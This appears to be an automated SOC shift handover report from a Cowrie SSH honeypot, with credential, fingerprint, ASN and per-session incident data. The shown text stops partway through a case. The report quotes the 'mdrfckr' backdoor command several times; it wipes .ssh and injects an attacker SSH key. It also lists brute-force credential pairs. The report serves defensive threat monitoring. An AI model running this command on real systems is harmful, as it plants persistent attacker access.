# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-10-16 |
| **Generated At** | 2026-10-16T02:06:11Z |
| **Shift Time** | 02:06 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **41** |
| Confirmed Threats | **33** |
| False Positives Filtered | **8** (19.5%) |
| Unique Attacker IPs | **31** |
| Countries of Origin | **16** |
| High Severity Cases | **21** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **20** |
| Malware Samples Analyzed | **7** HIGH · **25** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **118** |
| Unique Credential Pairs | **70** |
| Unique Usernames | **42** |
| Unique Passwords | **57** |
| Successful Auth Pairs | **96** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 24 |
| `345gs5662d34` | 22 |
| `admin` | 5 |
| `ubuntu` | 5 |
| `crystal` | 2 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 22 |
| `3245gs5662d34` | 22 |
| `teachers` | 2 |
| `password` | 2 |
| `admin@123` | 2 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 22 |
| `root` | `3245gs5662d34` | 10 |
| `root` | `teachers` | 2 |
| `admin` | `admin@123` | 2 |
| `demo` | `demo` | 2 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `teachers` | `195.178.110.218` | 2026-10-16T00:00:11 |
| `opc` | `password` | `193.112.192.91` | 2026-10-16T00:00:17 |
| `root` | `Bb123456` | `201.63.223.141` | 2026-10-16T00:00:24 |
| `345gs5662d34` | `345gs5662d34` | `201.63.223.141` | 2026-10-16T00:00:27 |
| `root` | `3245gs5662d34` | `201.63.223.141` | 2026-10-16T00:00:28 |
| `admin` | `admin` | `193.112.192.91` | 2026-10-16T00:00:30 |
| `root` | `teachers` | `10.0.0.73` | 2026-10-16T00:00:37 |
| `root` | `abcABC1234` | `201.63.223.141` | 2026-10-16T00:01:58 |
| `admin` | `admin@123` | `195.178.110.218` | 2026-10-16T00:01:58 |
| `admin` | `admin@123` | `10.0.0.73` | 2026-10-16T00:02:26 |
| `crystal` | `crystal123` | `201.63.223.141` | 2026-10-16T00:03:27 |
| `crystal` | `3245gs5662d34` | `201.63.223.141` | 2026-10-16T00:03:30 |
| `demo` | `demo` | `195.178.110.218` | 2026-10-16T00:03:45 |
| `demo` | `demo` | `10.0.0.73` | 2026-10-16T00:04:11 |
| `root` | `Admin1234.` | `201.63.223.141` | 2026-10-16T00:04:59 |
| `kafka` | `kafka` | `195.178.110.218` | 2026-10-16T00:05:31 |
| `kafka` | `kafka` | `10.0.0.73` | 2026-10-16T00:05:59 |
| `rtd` | `rtd` | `201.63.223.141` | 2026-10-16T00:06:33 |
| `rtd` | `3245gs5662d34` | `201.63.223.141` | 2026-10-16T00:06:37 |
| `user` | `user` | `195.178.110.218` | 2026-10-16T00:07:26 |
_… 76 more successful pair(s) in credentials.json_

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **41** |
| Sessions with Fingerprint | **14** |
| Unique HASSH Fingerprints | **14** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 20 |
| Go SSH scanner | 8 |
| Perl Net::SSH | 2 |
| Paramiko (Python) | 1 |
| Unknown | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 15 | 9 |
| `98f63c4d9c87...` | Generic scanner | 2 | 2 |
| `03a80b21afa8...` | Modern SSH client | 2 | 1 |
| `3c0eaacec19b...` | Mirai/variant | 2 | 2 |
| `16443846184e...` | Generic scanner | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 15 | 9 | Mirai/variant |
| `95420f9d932d...` | libssh | 3 | 3 | — |
| `98f63c4d9c87...` | Go SSH scanner | 2 | 2 | Generic scanner |
| `03a80b21afa8...` | libssh | 2 | 1 | Modern SSH client |
| `3c0eaacec19b...` | Perl Net::SSH | 2 | 2 | Mirai/variant |
| `16443846184e...` | Go SSH scanner | 1 | 1 | Generic scanner |
| `a2de0f306611...` | Paramiko (Python) | 1 | 1 | Mirai/variant |
| `dd9bcf093c35...` | Unknown | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **6** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 19 | 7 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `180.93.172.213`, `197.44.229.34`, `70.54.182.130`, `201.63.223.141`, `202.51.214.98`, `14.63.217.28`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **31** |
| Unique ASNs | **18** |
| High-Risk ASNs | **15** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS0` |  | 9 | HIGH |
| `AS213412` | ONYPHE SAS | 5 | LOW |
| `AS8075` | Microsoft Corporation | 2 | HIGH |
| `AS37611` | AFRIHOST SP (PTY) LTD | 1 | HIGH |
| `AS135944` | VinhNam Commercial informatics service corporation | 1 | HIGH |
| `AS58461` | CT HangZhou IDC | 1 | HIGH |
| `AS10429` | TELEFÔNICA BRASIL S.A | 1 | HIGH |
| `AS211056` | Amir Hosein Maaref | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (20)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-e374e4c33067

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]218` |
| **First Seen** | 2026-10-16 00:00 |
| **Last Seen** | 2026-10-16 00:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-16 00:00:10` | `cowrie.session.connect` |
| `2026-10-16 00:00:10` | `cowrie.client.version` |
| `2026-10-16 00:00:10` | `cowrie.client.kex` |
| `2026-10-16 00:00:11` | `cowrie.login.success` |
| `2026-10-16 00:00:11` | `cowrie.session.params` |
| `2026-10-16 00:00:11` | `cowrie.command.input` |
| `2026-10-16 00:00:12` | `cowrie.log.closed` |
| `2026-10-16 00:00:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]218` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eedcfeb398be

| Field | Detail |
|---|---|
| **Source IP** | `193.112.192[.]91` |
| **First Seen** | 2026-10-16 00:00 |
| **Last Seen** | 2026-10-16 00:00 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `hostname` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-16 00:00:16` | `cowrie.session.connect` |
| `2026-10-16 00:00:16` | `cowrie.client.version` |
| `2026-10-16 00:00:16` | `cowrie.client.kex` |
| `2026-10-16 00:00:17` | `cowrie.login.success` |
| `2026-10-16 00:00:18` | `cowrie.session.params` |
| `2026-10-16 00:00:18` | `cowrie.command.input` |
| `2026-10-16 00:00:18` | `cowrie.log.closed` |
| `2026-10-16 00:00:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.112.192[.]91` to AbuseIPDB if not already reported
- [ ] Block `193.112.192[.]91` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-53e713441bf6

| Field | Detail |
|---|---|
| **Source IP** | `201.63.223[.]141` |
| **First Seen** | 2026-10-16 00:00 |
| **Last Seen** | 2026-10-16 00:00 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-16 00:00:23` | `cowrie.session.connect` |
| `2026-10-16 00:00:23` | `cowrie.client.version` |
| `2026-10-16 00:00:23` | `cowrie.client.kex` |
| `2026-10-16 00:00:24` | `cowrie.login.success` |
| `2026-10-16 00:00:25` | `cowrie.session.params` |
| `2026-10-16 00:00:25` | `cowrie.command.input` |
| `2026-10-16 00:00:25` | `cowrie.command.failed` |
| `2026-10-16 00:00:25` | `cowrie.log.closed` |
| `2026-10-16 00:00:26` | `cowrie.session.params` |
| `2026-10-16 00:00:26` | `cowrie.command.input` |
| `2026-10-16 00:00:26` | `cowrie.session.file_download` |
| `2026-10-16 00:00:26` | `cowrie.log.closed` |
| `2026-10-16 00:00:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `201.63.223[.]141` to AbuseIPDB if not already reported
- [ ] Block `201.63.223[.]141` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bf9e35f172f4

| Field | Detail |
|---|---|
| **Source IP** | `201.63.223[.]141` |
| **First Seen** | 2026-10-16 00:00 |
| **Last Seen** | 2026-10-16 00:00 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-16 00:00:26` | `cowrie.session.connect` |
| `2026-10-16 00:00:26` | `cowrie.client.version` |
| `2026-10-16 00:00:26` | `cowrie.client.kex` |
| `2026-10-16 00:00:27` | `cowrie.login.success` |
| `2026-10-16 00:00:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `201.63.223[.]141` to AbuseIPDB if not already reported
- [ ] Block `201.63.223[.]141` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-10914708e3a7

| Field | Detail |
|---|---|
| **Source IP** | `180.93.172[.]213` |
| **First Seen** | 2026-10-16 00:18 |
| **Last Seen** | 2026-10-16 00:18 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-16 00:18:36` | `cowrie.session.connect` |
| `2026-10-16 00:18:36` | `cowrie.client.version` |
| `2026-10-16 00:18:37` | `cowrie.client.kex` |
| `2026-10-16 00:18:38` | `cowrie.login.success` |
| `2026-10-16 00:18:39` | `cowrie.session.params` |
| `2026-10-16 00:18:39` | `cowrie.command.input` |
| `2026-10-16 00:18:39` | `cowrie.command.failed` |
| `2026-10-16 00:18:39` | `cowrie.log.closed` |
| `2026-10-16 00:18:40` | `cowrie.session.params` |
| `2026-10-16 00:18:40` | `cowrie.command.input` |
| `2026-10-16 00:18:40` | `cowrie.session.file_download` |
| `2026-10-16 00:18:40` | `cowrie.log.closed` |
| `2026-10-16 00:18:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.93.172[.]213` to AbuseIPDB if not already reported
- [ ] Block `180.93.172[.]213` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-77bd32e11444

| Field | Detail |
|---|---|
| **Source IP** | `180.93.172[.]213` |
| **First Seen** | 2026-10-16 00:18 |
| **Last Seen** | 2026-10-16 00:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-16 00:18:40` | `cowrie.session.connect` |
| `2026-10-16 00:18:40` | `cowrie.client.version` |
| `2026-10-16 00:18:41` | `cowrie.client.kex` |
| `2026-10-16 00:18:42` | `cowrie.login.success` |
| `2026-10-16 00:18:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.93.172[.]213` to AbuseIPDB if not already reported
- [ ] Block `180.93.172[.]213` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9053dafb853d

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-10-16 00:19 |
| **Last Seen** | 2026-10-16 00:19 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-16 00:19:56` | `cowrie.session.connect` |
| `2026-10-16 00:19:56` | `cowrie.client.version` |
| `2026-10-16 00:19:56` | `cowrie.client.kex` |
| `2026-10-16 00:19:56` | `cowrie.login.success` |
| `2026-10-16 00:19:56` | `cowrie.direct-tcpip.request` |
| `2026-10-16 00:19:56` | `cowrie.direct-tcpip.data` |
| `2026-10-16 00:19:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7b11590ab057

| Field | Detail |
|---|---|
| **Source IP** | `14.63.217[.]28` |
| **First Seen** | 2026-10-16 00:24 |
| **Last Seen** | 2026-10-16 00:24 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-16 00:24:24` | `cowrie.session.connect` |
| `2026-10-16 00:24:24` | `cowrie.client.version` |
| `2026-10-16 00:24:25` | `cowrie.client.kex` |
| `2026-10-16 00:24:25` | `cowrie.login.success` |
| `2026-10-16 00:24:26` | `cowrie.session.params` |
| `2026-10-16 00:24:26` | `cowrie.command.input` |
| `2026-10-16 00:24:26` | `cowrie.command.failed` |
| `2026-10-16 00:24:27` | `cowrie.log.closed` |
| `2026-10-16 00:24:28` | `cowrie.session.params` |
| `2026-10-16 00:24:28` | `cowrie.command.input` |
| `2026-10-16 00:24:28` | `cowrie.session.file_download` |
| `2026-10-16 00:24:28` | `cowrie.log.closed` |
| `2026-10-16 00:24:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.63.217[.]28` to AbuseIPDB if not already reported
- [ ] Block `14.63.217[.]28` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b8ebf01bec14

| Field | Detail |
|---|---|
| **Source IP** | `14.63.217[.]28` |
| **First Seen** | 2026-10-16 00:24 |
| **Last Seen** | 2026-10-16 00:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-16 00:24:28` | `cowrie.session.connect` |
| `2026-10-16 00:24:28` | `cowrie.client.version` |
| `2026-10-16 00:24:28` | `cowrie.client.kex` |
| `2026-10-16 00:24:29` | `cowrie.login.success` |
| `2026-10-16 00:24:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.63.217[.]28` to AbuseIPDB if not already reported
- [ ] Block `14.63.217[.]28` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-30c603803eff

| Field | Detail |
|---|---|
| **Source IP** | `164.30.17[.]82` |
| **First Seen** | 2026-10-16 00:29 |
| **Last Seen** | 2026-10-16 00:29 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo xsec` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-16 00:29:36` | `cowrie.session.connect` |
| `2026-10-16 00:29:36` | `cowrie.client.version` |
| `2026-10-16 00:29:36` | `cowrie.client.kex` |
| `2026-10-16 00:29:38` | `cowrie.login.success` |
| `2026-10-16 00:29:39` | `cowrie.session.params` |
| `2026-10-16 00:29:39` | `cowrie.command.input` |
| `2026-10-16 00:29:39` | `cowrie.log.closed` |
| `2026-10-16 00:29:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `164.30.17[.]82` to AbuseIPDB if not already reported
- [ ] Block `164.30.17[.]82` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-899174ae5ac0

| Field | Detail |
|---|---|
| **Source IP** | `70.54.182[.]130` |
| **First Seen** | 2026-10-16 00:33 |
| **Last Seen** | 2026-10-16 00:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-16 00:33:56` | `cowrie.session.connect` |
| `2026-10-16 00:33:56` | `cowrie.client.version` |
| `2026-10-16 00:33:56` | `cowrie.client.kex` |
| `2026-10-16 00:33:56` | `cowrie.login.success` |
| `2026-10-16 00:33:57` | `cowrie.session.params` |
| `2026-10-16 00:33:57` | `cowrie.command.input` |
| `2026-10-16 00:33:57` | `cowrie.command.failed` |
| `2026-10-16 00:33:57` | `cowrie.log.closed` |
| `2026-10-16 00:33:57` | `cowrie.session.params` |
| `2026-10-16 00:33:57` | `cowrie.command.input` |
| `2026-10-16 00:33:58` | `cowrie.session.file_download` |
| `2026-10-16 00:33:58` | `cowrie.log.closed` |
| `2026-10-16 00:33:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `70.54.182[.]130` to AbuseIPDB if not already reported
- [ ] Block `70.54.182[.]130` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f96671e4b870

| Field | Detail |
|---|---|
| **Source IP** | `70.54.182[.]130` |
| **First Seen** | 2026-10-16 00:33 |
| **Last Seen** | 2026-10-16 00:33 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-16 00:33:58` | `cowrie.session.connect` |
| `2026-10-16 00:33:58` | `cowrie.client.version` |
| `2026-10-16 00:33:58` | `cowrie.client.kex` |
| `2026-10-16 00:33:58` | `cowrie.login.success` |
| `2026-10-16 00:33:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `70.54.182[.]130` to AbuseIPDB if not already reported
- [ ] Block `70.54.182[.]130` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-581c4a58bcb7

| Field | Detail |
|---|---|
| **Source IP** | `197.44.229[.]34` |
| **First Seen** | 2026-10-16 00:38 |
| **Last Seen** | 2026-10-16 00:38 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-16 00:38:08` | `cowrie.session.connect` |
| `2026-10-16 00:38:08` | `cowrie.client.version` |
| `2026-10-16 00:38:08` | `cowrie.client.kex` |
| `2026-10-16 00:38:08` | `cowrie.login.success` |
| `2026-10-16 00:38:09` | `cowrie.session.params` |
| `2026-10-16 00:38:09` | `cowrie.command.input` |
| `2026-10-16 00:38:09` | `cowrie.command.failed` |
| `2026-10-16 00:38:09` | `cowrie.log.closed` |
| `2026-10-16 00:38:10` | `cowrie.session.params` |
| `2026-10-16 00:38:10` | `cowrie.command.input` |
| `2026-10-16 00:38:10` | `cowrie.session.file_download` |
| `2026-10-16 00:38:10` | `cowrie.log.closed` |
| `2026-10-16 00:38:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.44.229[.]34` to AbuseIPDB if not already reported
- [ ] Block `197.44.229[.]34` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cbc3788d0a2c

| Field | Detail |
|---|---|
| **Source IP** | `197.44.229[.]34` |
| **First Seen** | 2026-10-16 00:38 |
| **Last Seen** | 2026-10-16 00:38 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-16 00:38:11` | `cowrie.session.connect` |
| `2026-10-16 00:38:11` | `cowrie.client.version` |
| `2026-10-16 00:38:11` | `cowrie.client.kex` |
| `2026-10-16 00:38:11` | `cowrie.login.success` |
| `2026-10-16 00:38:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.44.229[.]34` to AbuseIPDB if not already reported
- [ ] Block `197.44.229[.]34` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0e7651feecde

| Field | Detail |
|---|---|
| **Source IP** | `202.51.214[.]98` |
| **First Seen** | 2026-10-16 00:38 |
| **Last Seen** | 2026-10-16 00:38 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
